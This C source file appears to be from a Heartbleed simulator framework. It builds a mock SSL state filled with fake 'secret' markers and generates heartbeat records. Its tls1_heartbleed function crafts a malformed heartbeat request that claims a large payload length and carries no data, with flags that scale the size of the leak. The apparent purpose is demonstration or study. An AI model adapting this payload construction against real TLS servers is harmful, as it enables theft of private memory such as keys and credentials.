/*
 * HeartBit -- the HeartBeat Simulator Framework
 *
 * Copyright (C) 2014 Bolo -- Josef T. Burger
 *
 * All original work here is distributed via a BSD license terms.
 * Basically you are free to use it and you can't take credit for it.
 *
 * Portions of this may reflect code structure and comments from
 * from the openssl codebase.  Please check the SSL copyright if you
 * create deriviative works that would conflict with any copyrights
 * on that code.
 *
 * The SSL copyright is not present because extracts of code are not
 * copyright violations, and fall under the fair use clause of the
 * copyright act.
 */


#include "red.h"

static char *_name = "<noname>";

/* How much to bleed, not a byte count, but bigger values === more */
static int blood = 0;
static int bleed_size = 0;


void fill_buffer(unsigned char *s, int len, char *pat, int patlen)
{
	int	l = patlen ? patlen : strlen(pat);

	while (len) {
		if (l > len)
			l = len;
		memcpy(s, pat, l);
		s += l;
		len -= l;
	}
}


void init_rec_buf(SSL3_RECORD *r, SSL3_BUFFER *b)
{
	r->data = r->input = &b->buf[0];
	r->type = 0;
	r->length = b->len;
	r->off = 0;
}


void init_ssl3(SSL3_STATE *s3, SSL *s)
{
	ssl3_setup_read_buffer(s);
	ssl3_setup_write_buffer(s);

	init_rec_buf(&s3->rrec, &s3->rbuf);
	init_rec_buf(&s3->wrec, &s3->wbuf);

	fill_buffer(&s3->rbuf.buf[0], s3->rbuf.len,
		    "|READBUF-PRIVATE-CONFIDENTIAL-SECRET", 0);
	fill_buffer(&s3->wbuf.buf[0], s3->wbuf.len,
		    "|writebuf-private-confidential-secret", 0);

	s3->init_extra = 0;

	s3->major = 0;
	s3->minor = 0;
}



/* Takes a chunk of memory and initializes it */
void init_ssl(SSL *s)
{
	int	i;

	s->packet = 0;
	s->packet_length = 0;

	s->msg_callback = 0;
	s->msg_callback_arg = 0;

	s->tlsext_heartbeat = SSL_TLSEXT_HB_ENABLED;
	s->tlsext_hb_seq = 42;	/* use something recognizable */
	s->tlsext_hb_pending = 0;
	s->in_handshake = 0;

	s->version = (SSL_VER_MAJOR << 8) | SSL_VER_MINOR;
	s->max_send_fragment = SSL3_RT_MAX_PLAIN_LENGTH;
	s->options = 0;

	s->s3 = &s->_s3;
	init_ssl3(s->s3, s);

	/* Add some extra juicy memory to try and have nice stuff to look
	   at instead of a bunch of binary junk */
	for (i = 0; i < NUM_RAND_ALLOCS; i++) {
		char		text[80];
		unsigned char	*p;
		int		pl;

		/* XXX could just allocate 1/4 page, 1/2 page ... */

		sprintf(text, "|OTHER-PRIVATE-CONFIDENTIAL-SECRET-MEMORY-%02d", i);
		pl = strlen(text) * 32 * (i+1);
		p = malloc(pl);
		fill_buffer(p, pl, text, 0);

		s->random_memory[i] = p;
	}
}


/* Guarantee memory munging of data to write back so it looks valid */
/* XXX doing this instead of rot13, because rot13 only touches ascii a-z
   characters, and it doesn't modify binary data.  XOR modifies everything
   repeatably */
void encrypt_decrypt(unsigned char *ptr, int len)
{
	int	i;

	for (i = 0; i < len; i++)
		ptr[i] ^= 0xff;
}


/* XXX the problem here is that the buffer has to be output
   as a bunch of packets.  This makes things more difficult.
   Do the "simple version" first and then do the full version.
   XXX that drives up the cost more, because you then have to 
   reassemble the packets into a record. */

/* Encode traffic and write ssl packet with the content and type. */

int ssl3_write_bytes(SSL *s, int type, unsigned char *buf, int len)
{
	SSL3_BUFFER	*wb = &s->s3->wbuf;
	unsigned char	*p = &wb->buf[0];
	SSL3_RECORD	*wr = &s->s3->wrec;
	int		n;
	int		payload_len = len + MAC_SZ;
	int		pack_len = payload_len + SSL_HDR_LEN;

	if (len + SSL_HDR_LEN + MAC_SZ > wb->len) {
		fprintf(stderr,
			"%s: ssl3_write: buffer %d + ov %d = %d too large for I/O %d\n",
			_name,
			len, (int) (5+MAC_SZ), (int) (len+5+MAC_SZ), wb->len);
		exit(1);
	}

	wr->data = p;

	/* marshall the packet info */
	*p++ = type;			/* type */
	*p++ = s->version >> 8;		/* version (major, minor) */
	*p++ = s->version & 0xff;
	s2n(payload_len, p);		/* payload length > buf len */

	/* marshall the content */
	memcpy(p, buf, len);
	encrypt_decrypt(p,len);
	p += len;

	/* add the MAC */
	memcpy(p, MAC, MAC_SZ);
	p += MAC_SZ;

	wr->length = p - wr->data;
	if (wr->length != pack_len) {
		fprintf(stderr, "%s: packet length mismatch %d sb %d\n",
			_name,
			wr->length, pack_len);
		exit(1);
	}

	n = fwrite(wr->data, 1, wr->length, stdout);
	if (n == 0) {
		fprintf(stderr, "%s: done\n", _name);
		exit(1);
	}
	if (n != wr->length) {
		perror("fread");
		fprintf(stderr, "%s: packet short write length %d != %d\n", 
			_name,
			n, wr->length);
		exit(1);
	}
	fprintf(stderr, "%s: wrote %d byte packet for buf len %d\n", 
		_name,
		wr->length, len);

	return len;
}

/*
 * HeartBeat Packet contents as intended by openssl
 *
 *	b8	type	HB_REQUEST or HB_RESPONSE
 *	u16	hblen	Length of HB payload data
 *	u16	seqno	Sequence number
 *	b128	junk	Random Psuedo Bytes
 *	b128	padding
 */

#define	HB_HDR_LEN	3	/* type + hblen */

/* Generate a "fake" SSL HB Packet with long hblen and no payload, or
   enough payload to make it look "legit". */

/* XXX length > buffer size yet */

/* Packets limited to 64k minus overheads due to SSL and heartbeat processing */
/* XXX check these semantics more exactly seems a bit wrong, but I might
   be emulating something incorrectly.  Part of this is because I don't
   send packets as traffic and didn't look into that. */

#define	SSL_OVERHEAD	(SSL_HDR_LEN + HB_HDR_LEN + PADDING_SZ + MAC_SZ)

void tls1_heartbleed(SSL *s)
{
	unsigned char	buf[3];	/* that's all you need */
	unsigned char	*p;	/* marshal pointer */
	/* need to leave room for SSL_HDR + HB_HDR + PADDING + MAC */
	int	ssl_overhead = SSL_OVERHEAD;
	int	hblen;
	int	maxbuf = s->s3->rbuf.len;

	if (blood > 2)
		hblen = 0xffff;
	else if (blood > 1)
		hblen = maxbuf * 2;
	else if (blood > 0)
		hblen = maxbuf;
	else if (blood == 0)
		hblen = 75;
	else /* blood < 0 */
		hblen = bleed_size;

	/* SSL packets limited to 2^16, back off to steal the most */
	hblen -= ssl_overhead;

	p = buf;
	*p++ = TLS1_HB_REQUEST;
	s2n(hblen, p);

	/* XXX and then nothing else */

	ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buf, p - buf);
}

void generate_ssl_traffic(SSL *s, int bleed)
{

	fprintf(stderr, "%s: make Heart-%s packet\n", _name,
		bleed ? "Bleed" : "Beat");

	if (bleed)
		tls1_heartbleed(s);
	else
		tls1_heartbeat(s);
}



int main(int argc, char **argv)
{
	char	namebuf[128];
	SSL	*s = 0;
	int	c;
	int	err = 0;
	int	bleed = 0;


	sprintf(namebuf, "gen-blood");
	_name = namebuf;

	while ((c = getopt(argc, argv, "bBs:")) != EOF) {
		switch (c) {
		case 'b':
			bleed++;
			break;
		case 'B':
			blood++;
			bleed++;
			break;
		case 's':
			blood = -1;
			bleed_size = atoi(optarg);
			if (bleed_size <= 0 || bleed_size > 0xffff) {
				fprintf(stderr, "%s: %s: bad bleed size\n",
					argv[0], optarg);
				err++;
			}
			/* impossible to task for more, 2^16 or less will
			   be sized automagically to fit SSL */
			break;
		default:
			err++;
			break;
		}
	}

	if (err) {
		fprintf(stderr,
			"usage: %s [-s bleed_size] [-B] [-b]\n",
			argv[0]);
		fprintf(stderr, "\tDefault is to create a SSL heartbeat\n");
		fprintf(stderr, "\t-b == Make a default-sized heartbleed\n");
		fprintf(stderr, "\t-B == Each -B scales larger bleed\n");
		fprintf(stderr, "\t-s count == Bleed specified # bytes\n");
		exit(1);
	}

	sprintf(namebuf, "%s", bleed ? "gen-blood" : "gen-beat");
	_name = namebuf;
			
	s = malloc(sizeof(SSL));
	if (!s) {
		perror("malloc SSL");
		return(1);
	}
	init_ssl(s);


	generate_ssl_traffic(s, bleed);

	return 0;
}
